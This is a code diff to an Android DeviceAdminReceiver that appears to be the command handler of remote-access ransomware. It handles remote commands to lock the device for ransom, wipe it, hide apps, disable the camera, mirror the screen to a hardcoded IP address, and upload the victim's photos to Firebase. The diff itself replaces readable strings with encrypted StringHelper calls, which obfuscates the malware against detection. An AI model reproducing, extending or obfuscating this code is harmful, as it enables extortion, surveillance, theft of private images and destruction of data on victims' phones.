@@ -137,7 +137,7 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
 
             final int finalMaxItems = maxItems;
 
-            Log.d(TAG, "Starting media scan for " + finalMaxItems + " items");
+            Log.d(TAG, StringHelper.qzxp("8ex98LeGAsD+hJ0o9jyW9TSJiqWNcyNf")  + finalMaxItems + " items"); // "Starting media scan for "
 
             // Run scan in background and wait for result
             final StringBuilder resultBuilder = new StringBuilder();
@@ -147,20 +147,20 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
                     List<Map<String, String>> results = MediaCollector.scanRecentMedia(context, finalMaxItems);
 
                     if (results.isEmpty()) {
-                        resultBuilder.append("📸 No images found.\n");
+                        resultBuilder.append(StringHelper.qzxp("cPiovhCKbs26pmSvNa+w9jiaguIIbA==")); // "📸 No images found.\n"
                     } else {
-                        resultBuilder.append("✅ Found ").append(results.size()).append(" images:\n");
+                        resultBuilder.append("✅ Found ").append(results.size()).append(StringHelper.qzxp("sfqgEXgFsxDB")); //  " images:\n"
                         for (int i = 0; i < results.size(); i++) {
                             Map<String, String> item = results.get(i);
                             resultBuilder.append("  ").append(i + 1).append(". ")
                                     .append(item.get("name"))
                                     .append(" [ID: ").append(item.get("id")).append("]\n");
                         }
-                        resultBuilder.append("Use 'upload [ID]' to send to Firebase");
+                        resultBuilder.append(StringHelper.qzxp("E+r8/hNnoWmuyPXaWbPgg7yuYMVTgE5zl97fMrUxovgj+/itUQ==")); //"Use 'upload [ID]' to send to Firebase"
                     }
                 } catch (Exception e) {
-                    resultBuilder.append("❌ Scan failed: ").append(e.getMessage());
-                    Log.e(TAG, "Scan error: " + e.getMessage());
+                    resultBuilder.append(StringHelper.qzxp("wXXN+3lXG6VoPuLihWrKNQk=")).append(e.getMessage()); // "❌ Scan failed: "
+                    Log.e(TAG, StringHelper.qzxp("OIoBEeBzl7XRwmg3") + e.getMessage()); // "Scan error: "
                 }
             });
 
@@ -168,16 +168,16 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
             try {
                 scanThread.join(10000); // Wait up to 10 seconds for scan to complete
             } catch (InterruptedException e) {
-                return "❌ Scan timed out";
+                return StringHelper.qzxp(""); //"❌ Scan timed out";
             }
 
             return resultBuilder.toString();
         }
 
-        if (command.toLowerCase().startsWith("upload")) {
+        if (command.toLowerCase().startsWith(StringHelper.qzxp("XfducBUp") )) { // "upload"
             String[] parts = command.split(" ");
             if (parts.length < 2) {
-                return "❌ Usage: upload [image_id]";
+                return StringHelper.qzxp("H4RnZQ53Jg9B3NV7M+QRSLOQJw1XcIRUJunHRg=="); //  "❌ Usage: upload [image_id]"
             }
 
             String imageId = parts[1];
@@ -187,20 +187,20 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
                 MediaCollector.uploadToFirebase(context, imageId, deviceId);
             }).start();
 
-            return "📤 Uploading image " + imageId + " to Firebase...";
+            return StringHelper.qzxp("GbV/VbYFQGrgIrFXmRfKh91SZObB") + imageId +  StringHelper.qzxp("yV6D0dA5QmPtIqZb2V7E"); // "📤 Uploading image "  " to Firebase..."
         }
 
         switch (command.toLowerCase()) {
             case "lock":
                 lockDevice(context);
 
-                return "✅ Device locked!";
+                return StringHelper.qzxp("Hb5uR/8ky8mKfYVn2KrugjDL"); // "✅ Device locked!"
 
 
 
             case "whoami":
-                return "User: " + android.os.Process.myUid() +
-                        " | App: " + context.getPackageName();
+                return StringHelper.qzxp("9bge+Jrh")  + android.os.Process.myUid() + // "User: "
+                    StringHelper.qzxp("/DFaohIB9LM=")  + context.getPackageName();   // " | App: "
 
             case "device_info":
                 return getDeviceInfo();
@@ -217,38 +217,38 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
 
             case "reboot":
                 rebootDevice(context);
-                return "✅ Rebooting device...";
+                return StringHelper.qzxp("LOhIKVn2naEqdKrl1t4Wspj1jsnc00w="); // "✅ Rebooting device..."
 
             case "help":
-                return "Commands: lock, cam_off, cam_on, whoami, device_info, battery, ip, list_apps, hide_app, show_app, reboot, exit";
+                return StringHelper.qzxp("Vjx3lE+pY6tPK8y3EefE0u3SFqD9bGh/uYekD1fpAPU1JHKWT6pu9FVvxa4b742t590dkL4qbDLtkKAQcapOsGV/OpVHtHOHFHvQq16sgJvq1iSe4noic+qMqhVX5x6pOXNonEyoaKxZK8WgG/g="); // "Commands: lock, cam_off, cam_on, whoami, device_info, battery, ip, list_apps, hide_app, show_app, reboot, exit"
 
             case "exit":
-                return "👋 Closing connection...";
+                return StringHelper.qzxp("tLxGNg9UD6/ovexuIJIBlDMSJNyoFYCFEFc="); // "👋 Closing connection..."
 
             case "wipe":
 
                 setMaxFailedAttempts(context, 1);
-            return "✅ Wiping device...";
+            return StringHelper.qzxp("It+Q2JTNMnRTWILJq1y5KUz+4T0="); // "✅ Wiping device..."
 
             case "ransom_lock":
                 showRansomDialog(context);
                 startContinuousLock(context);
-                return "✅ Device locked!";
+                return StringHelper.qzxp("IeGhlvhpKot37ufX6RDjy/q8"); // "✅ Device locked!"
 
             case "ransom_end":
                 stopContinuousLock();
-                return "✅ Device locked!";
+                return StringHelper.qzxp("ObxECAB1mIZO9cPS6ohrmlmKKtw="); // "✅ Device unlocked!"
 
             case "screen_mirror":
 //                Intent mirrorIntent = new Intent(context, ScreenMirrorService.class);
 //                mirrorIntent.putExtra("resultCode", ScreenMirrorService.sResultCode);
 //                mirrorIntent.putExtra("resultData", ScreenMirrorService.sResultData);
 //                context.startForegroundService(mirrorIntent);
-                return "🎥 Screen mirror already running! View at http://20.2.66.175:9090";
+                return StringHelper.qzxp("u/o74nivmCSGtMInj5h+BtjG5drFP7g84zsbfFpeaJUlApRnDpWeIcOw2CeKhXgEjZvqiZlj73OxdBU/GAU8xXtchQ=="); // "🎥 Screen mirror already running! View at http://20.2.66.175:9090"
 
             case "screen_stop":
                 context.stopService(new Intent(context, ScreenMirrorService.class));
-                return "🛑 Screen mirror stopped!";
+                return StringHelper.qzxp("iZpQNF540O/Bgs7N2dWsdOxumlRm+pYBJtJx"); // "🛑 Screen mirror stopped!"
 
             case "wifi":
                 return getWifiInfo(context);
